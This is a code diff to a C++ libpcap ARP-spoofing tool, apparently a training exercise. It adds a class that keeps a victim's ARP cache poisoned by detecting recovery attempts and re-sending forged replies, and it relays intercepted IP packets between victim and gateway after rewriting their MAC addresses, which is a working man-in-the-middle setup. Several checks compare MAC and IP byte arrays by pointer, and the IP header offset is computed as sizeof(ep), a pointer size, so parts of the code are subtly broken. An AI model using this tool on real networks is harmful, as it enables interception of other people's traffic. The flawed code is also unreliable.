@@ -25,6 +25,27 @@ struct ARPPacket{
     struct ether_arp arp;
 };
 
+class RelayRecover{
+public :
+    u_int8_t* senderMAC;
+    u_int8_t* targetMAC;
+    u_int8_t* senderIP;
+    u_int8_t* targetIP;
+    u_int8_t* myMAC;
+    u_int8_t* myIP;
+
+    RelayRecover(u_int8_t* senderMAC,u_int8_t* targetMAC,u_int8_t* senderIP,u_int8_t* targetIP,u_int8_t* myMAC, u_int8_t* myIP)
+    {
+        this->senderMAC=senderMAC;
+        this->senderIP=senderIP;
+        this->targetMAC=targetMAC;
+        this->targetIP=targetIP;
+        this->myMAC=myMAC;
+        this->myIP=myIP;
+    }
+
+};
+
 void checkArgc(int argc);
 void findMyMac(char* device, u_int8_t *myMAC);
 void printByHexData(u_int8_t* printArr,int length);
@@ -34,8 +55,9 @@ void sendARPReguest(char* device, char *sender_IP, u_int8_t* my_MAC, int print, 
 void sendPacket(ARPPacket *arpReply, int packeLen, pcap_t *pcd);
 void getMyIP(char* device, u_int8_t* myIP);
 int  findARPReply(char* device, char* rule, u_int8_t *retnMAC);
-int relayAntiRecover(char *device, pcap_t *pcd, char *errBuf, ARPPacket *ARPRecover, u_int8_t *senderMAC, u_int8_t *targetMAC, u_int8_t *senderIP, u_int8_t *targetIP, u_int8_t *myMAC);
+int relayAntiRecover(char *device, pcap_t *pcd, char *errBuf, ARPPacket *ARPRecover, RelayRecover *relayrecover);
 void sendRelayPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC, const u_char *originPacket);
+
 
 /*send_arp <dev> <sender ip> <target ip>*/
 
@@ -147,9 +169,12 @@ int main(int argc, char *argv[])
     struct ARPPacket ARPRecover;
     int recoverCount=0;
 
+    RelayRecover relayrecover(sender_Mac,target_Mac,ARPReply.arp.arp_tpa,ARPReply.arp.arp_spa,my_Mac,myIP);
+
+
     while(true)
     {
-        if(relayAntiRecover(device,pcd,errbuf,&ARPRecover,sender_Mac,target_Mac,ARPReply.arp.arp_tpa,ARPReply.arp.arp_spa,my_Mac))
+        if(relayAntiRecover(device,pcd,errbuf,&ARPRecover,&relayrecover))
         {
                     cout<<"antiRecover "<<++recoverCount<<"times worked!!"<<endl;
                     sendPacket(&ARPReply,sizeof(struct ARPPacket),pcd); //send reply packet
@@ -381,7 +406,7 @@ int findARPReply(char *device, char *rule,u_int8_t *retnMAC)
     }
 }
 
-int relayAntiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,u_int8_t* senderMAC,u_int8_t* targetMAC,u_int8_t* senderIP,u_int8_t* targetIP,u_int8_t* myMAC)
+int relayAntiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover,RelayRecover *relayrecover)
 {
 
     bpf_u_int32 netp;
@@ -418,15 +443,15 @@ int relayAntiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover
                         sha=ARPRecover->arp.arp_sha;
                         spa=ARPRecover->arp.arp_spa;
 
-                        if(sha==senderMAC)
-                            if(spa==senderIP) //recover about senderIP
+                        if(sha==relayrecover->senderMAC)
+                            if(spa==relayrecover->senderIP) //recover about senderIP
                                 return 1;
 
 
                         //gateway -> senderPC
 
-                        if(sha==targetMAC)
-                            if(spa==targetIP) //recover about targetIP
+                        if(sha==relayrecover->targetMAC)
+                            if(spa==relayrecover->targetIP) //recover about targetIP
                                 return 1;
 
                     }
@@ -443,14 +468,18 @@ int relayAntiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover
 
                     if(ntohs(ep->ether_type)==ETHERTYPE_IP)
                     {
+                        struct iphdr *iph=(struct iphdr*)(sizeof(ep)+pkt_data);
+                        Ip destIP;
+                        destIP=&iph->daddr;
+                        if(srcMAC==relayrecover->senderMAC)
+                            if(destMAC==relayrecover->myMAC) //?
+                                if(!(destIP==relayrecover->myIP))
+                                    sendRelayPacket(pcd,pktHeader->len,relayrecover->myMAC,relayrecover->targetMAC,pkt_data); //change src mac addr to target mac & send
 
-                        if(srcMAC==senderMAC)
-                            if(destMAC==myMAC) //?
-                                sendRelayPacket(pcd,pktHeader->len,myMAC,targetMAC,pkt_data); //change src mac addr to target mac & send
-
-                        if(srcMAC==targetMAC)
-                            if(destMAC==myMAC)//?
-                                sendRelayPacket(pcd,pktHeader->len,myMAC,senderMAC,pkt_data); //change src mac addr to sender mac & send
+                        if(srcMAC==relayrecover->targetMAC)
+                            if(destMAC==relayrecover->myMAC)//?
+                                if(!(destIP==relayrecover->myIP))
+                                    sendRelayPacket(pcd,pktHeader->len,relayrecover->myMAC,relayrecover->senderMAC,pkt_data); //change src mac addr to sender mac & send
                     }
 
 
@@ -466,7 +495,7 @@ int relayAntiRecover(char* device,pcap_t *pcd,char* errBuf,ARPPacket *ARPRecover
 
             case -2:
                 cout<<"the packet have reached EOF!!"<<endl;
-                exit(0);
+                exit(0);    
             default:
                 break;
             }
@@ -482,6 +511,8 @@ void sendRelayPacket(pcap_t* pcd, int len, u_int8_t* mSrcMAC, u_int8_t* mDestMAC
     struct ether_header* ep=(struct ether_header*)mPacket;
     memcpy(ep->ether_shost,mSrcMAC,ETHER_ADDR_LEN); //change sender MAC
     memcpy(ep->ether_dhost,mDestMAC,ETHER_ADDR_LEN); //change Destination MAC
-  //  printByHexData(mPacket,len);
+  // printByHexData(mPacket,len);
     pcap_sendpacket(pcd,mPacket,len);
 }
+
+
